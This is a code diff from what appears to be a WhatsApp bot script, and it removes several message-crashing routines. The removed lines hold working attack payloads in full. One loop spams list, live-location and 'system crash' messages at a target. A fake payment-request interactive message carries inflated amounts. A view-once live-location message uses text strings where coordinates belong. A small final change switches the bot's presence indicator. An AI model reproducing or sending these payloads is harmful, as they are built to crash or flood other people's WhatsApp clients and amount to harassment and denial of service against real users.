@@ -446,70 +446,6 @@ participant: mek.key.participant
 })
 }
 	 
-async function sendVariousMessages(jid, count) {
-  for (let i = 0; i < count; i++) {
-    sendListMessage(jid);
-    sendLiveLocationMessage(jid);
-    sendSystemCrashMessage(jid);
-    await sleep(500);
-  }
-}
-
-const statrp = {
-key: {
-participant: `0@s.whatsapp.net`,
-...(m.chat ? {
-remoteJid: "status@broadcast"
-} : {})
-},
-message: {
-listResponseMessage: {
-title: `🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑`
-}
-}
-}
-	 
-const force = {
-  key: {
-    participant: `0@s.whatsapp.net`,
-    ...(m.chat ? {
-      remoteJid: "status@broadcast"
-    } : {})
-  },
-  'message': {
-    "interactiveMessage": {
-      "header": {
-        "hasMediaAttachment": true,
-        "jpegThumbnail": fs.readFileSync(`./image/latx.png`)
-      },
-      "nativeFlowMessage": {
-        "buttons": [
-          {
-            "name": "review_and_pay",
-            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
-}
-]
-      }
-    }
-  }
-}
-
-
- async function ngeloc(target, kuwoted) {
-var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-viewOnceMessage: {
-message: {
-  "liveLocationMessage": {
-    "degreesLatitude": "🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑",
-    "degreesLongitude": "🖤⟩ ༘྅Lets Dance☆ ꧏ🤍҈ ༑",
-    "caption": `🖤⟩ ༘྅Booom 😅 ☆ ꧏ🤍҈ ༑`,
-    "sequenceNumber": "9",
-    "jpegThumbnail": ""
-     }
-  }
-}
-}), { userJid: m.chat, quoted: kuwoted })
-await zetsubo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
  }
 
 /*let reactionMessage = {
@@ -524,7 +460,7 @@ await zetsubo.relayMessage(target, etc.message, { participant: { jid: target }, 
 if (!zetsubo.public) {
 if (!m.key.fromMe) return
 }
-let rn = ['typing'] 
+let rn = ['recording'] 
 let jd = rn[Math.floor(Math.random() * rn.length)];
 if (m.message) {
 zetsubo.sendPresenceUpdate(jd, from)
